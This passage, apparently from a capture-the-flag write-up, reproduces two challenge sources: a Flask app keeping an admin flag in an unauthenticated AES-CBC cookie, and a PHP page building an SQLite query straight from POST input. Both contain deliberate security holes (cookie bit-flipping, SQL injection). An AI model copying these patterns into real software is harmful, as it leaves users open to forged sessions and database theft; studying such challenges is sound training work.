    cookie['username'] = request.form['user']
    cookie['admin'] = 0
    print(cookie)
    cookie_data = json.dumps(cookie, sort_keys=True)
    encrypted = AESCipher(app.secret_key).encrypt(cookie_data)
    print(encrypted)
    resp.set_cookie('cookie', encrypted)
    return resp

@app.route('/logout')
def logout():
    resp = make_response(redirect("/"))
    resp.set_cookie('cookie', '', expires=0)
    return resp

@app.route('/flag', methods=['GET'])
def flag():
  try:
      encrypted = request.cookies['cookie']
  except KeyError:
      flash("Error: Please log-in again.")
      return redirect(url_for('main'))
  data = AESCipher(app.secret_key).decrypt(encrypted)
  data = json.loads(data)

  try:
     check = data['admin']
  except KeyError:
     check = 0
  if check == 1:
      return render_template('flag.html', value=flag_value)
  flash("Success: You logged in! Not sure you'll be able to see the flag though.", "success")
  return render_template('not-flag.html', cookie=data)

class AESCipher:
    """
    Usage:
        c = AESCipher('password').encrypt('message')
        m = AESCipher('password').decrypt(c)
    Tested under Python 3 and PyCrypto 2.6.1.
    """

    def __init__(self, key):
        self.key = md5(key.encode('utf8')).hexdigest()

    def encrypt(self, raw):
        raw = pad(raw)
        iv = Random.new().read(AES.block_size)
        cipher = AES.new(self.key, AES.MODE_CBC, iv)
        return b64encode(iv + cipher.encrypt(raw))

    def decrypt(self, enc):
        enc = b64decode(enc)
        iv = enc[:16]
        cipher = AES.new(self.key, AES.MODE_CBC, iv)
        return unpad(cipher.decrypt(enc[16:])).decode('utf8')

if __name__ == "__main__":
    app.run()
```

## 【X】A Simple Question

```1538828295272php+HTML
<?php
  include "config.php";
  ini_set('error_reporting', E_ALL);
  ini_set('display_errors', 'On');

  $answer = $_POST["answer"];
  $debug = $_POST["debug"];
  $query = "SELECT * FROM answers WHERE answer='$answer'";
  echo "<pre>";
  echo "SQL query: ", htmlspecialchars($query), "\n";
  echo "</pre>";
?>
<?php
  $con = new SQLite3($database_file);
  $result = $con->query($query);

  $row = $result->fetchArray();
  if($answer == $CANARY)  {
    echo "<h1>Perfect!</h1>";
    echo "<p>Your flag is: $FLAG</p>";
  }
  elseif ($row) {
    echo "<h1>You are so close.</h1>";
  } else {
    echo "<h1>Wrong.</h1>";
  }
?>
```
